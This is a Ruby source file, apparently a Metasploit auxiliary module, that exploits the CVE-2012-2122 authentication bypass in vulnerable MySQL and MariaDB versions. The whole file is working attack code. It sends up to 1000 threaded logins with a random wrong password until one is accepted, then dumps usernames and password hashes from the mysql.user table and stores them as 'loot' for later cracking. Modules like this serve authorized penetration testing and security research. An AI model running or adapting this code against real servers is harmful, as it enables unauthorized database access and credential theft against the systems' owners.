##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/mysql/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'MySQL Authentication Bypass Password Dump',
      'Description' => %Q{
        This module exploits a password bypass vulnerability in MySQL in order
        to extract the usernames and encrypted password hashes from a MySQL server.
        These hashes are stored as loot for later cracking.

        Impacts MySQL versions:
        - 5.1.x before 5.1.63
        - 5.5.x before 5.5.24
        - 5.6.x before 5.6.6

        And MariaDB versions:
        - 5.1.x before 5.1.62
        - 5.2.x before 5.2.12
        - 5.3.x before 5.3.6
        - 5.5.x before 5.5.23
      },
      'Author' => [
        'theLightCosine', # Original hashdump module
        'jcran' # Authentication bypass bruteforce implementation
      ],
      'References' => [
        ['CVE', '2012-2122'],
        ['OSVDB', '82804'],
        ['URL', 'https://www.rapid7.com/blog/post/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/']
      ],
      'DisclosureDate' => 'Jun 09 2012',
      'License' => MSF_LICENSE
    )

    deregister_options('PASSWORD')
    register_options([
      OptString.new('USERNAME', [ true, 'The username to authenticate as', "root" ])
    ])
  end

  def run_host(ip)
    # Keep track of results (successful connections)
    results = []

    # Username and password placeholders
    username = datastore['USERNAME']
    password = Rex::Text.rand_text_alpha(rand(8) + 1)

    # Do an initial check to see if we can log into the server at all

    begin
      socket = connect(false)
      close_required = true
      mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: socket)
      results << mysql_client
      close_required = false

      print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{mysql_client.peerhost}:#{mysql_client.peerport}"
    rescue ::Rex::Proto::MySQL::Client::HostNotPrivileged
      print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
      return
    rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
      print_good "#{rhost}:#{rport} The server allows logins, proceeding with bypass test"
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error "#{rhost}:#{rport} Error: #{e}"
      return
    ensure
      socket.close if socket && close_required
    end

    # Short circuit if we already won
    if results.length > 0
      self.mysql_conn = results.first
      return dump_hashes(mysql_client.peerhost, mysql_client.peerport)
    end

    #
    # Threaded login checker
    #
    max_threads = 16
    cur_threads = []

    # Try up to 1000 times just to be sure
    queue = [*(1..1000)]

    while (queue.length > 0)
      while (cur_threads.length < max_threads)

        # We can stop if we get a valid login
        break if results.length > 0

        # keep track of how many attempts we've made
        item = queue.shift

        # We can stop if we reach 1000 tries
        break if not item

        # Status indicator
        print_status "#{rhost}:#{rport} Authentication bypass is #{item / 10}% complete" if (item % 100) == 0

        t = Thread.new(item) do |count|
          begin
            # Create our socket and make the connection
            close_required = true
            s = connect(false)
            mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: s)

            print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
            results << mysql_client
            close_required = false
          rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
          rescue ::Exception => e
            print_bad "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
          ensure
            s.close if socket && close_required
          end
        end

        cur_threads << t
      end

      # We can stop if we get a valid login
      break if results.length > 0

      # Add to a list of dead threads if we're finished
      cur_threads.each_index do |ti|
        t = cur_threads[ti]
        if not t.alive?
          cur_threads[ti] = nil
        end
      end

      # Remove any dead threads from the set
      cur_threads.delete(nil)

      ::IO.select(nil, nil, nil, 0.25)
    end

    # Clean up any remaining threads
    cur_threads.each { |x| x.kill }

    if results.length > 0
      print_good("#{mysql_client.peerhost}:#{mysql_client.peerport} Successfully exploited the authentication bypass flaw, dumping hashes...")
      self.mysql_conn = results.first
      return dump_hashes(mysql_client.peerhost, mysql_client.peerport)
    end

    print_error("#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable")
  end

  def dump_hashes(host, port)
    # Grabs the username and password hashes and stores them as loot
    res = mysql_query("SELECT user,password from mysql.user")
    if res.nil?
      print_error("#{host}:#{port} There was an error reading the MySQL User Table")
      return

    end

    # Create a table to store data
    tbl = Rex::Text::Table.new(
      'Header' => 'MysQL Server Hashes',
      'Indent' => 1,
      'Columns' => ['Username', 'Hash']
    )

    if res.size > 0
      res.each do |row|
        next unless (row[0].to_s + row[1].to_s).length > 0

        tbl << [row[0], row[1]]
        print_good("#{host}:#{port} Saving HashString as Loot: #{row[0]}:#{row[1]}")
      end
    end

    this_service = nil
    if framework.db and framework.db.active
      this_service = report_service(
        :host => host,
        :port => port,
        :name => 'mysql',
        :proto => 'tcp'
      )
    end

    report_hashes(tbl.to_csv, this_service, host, port) unless tbl.rows.empty?
  end

  # Stores the Hash Table as Loot for Later Cracking
  def report_hashes(hash_loot, service, host, port)
    filename = "#{host}-#{port}_mysqlhashes.txt"
    path = store_loot("mysql.hashes", "text/plain", host, hash_loot, filename, "MySQL Hashes", service)
    print_good("#{host}:#{port} Hash Table has been saved: #{path}")
  end
end
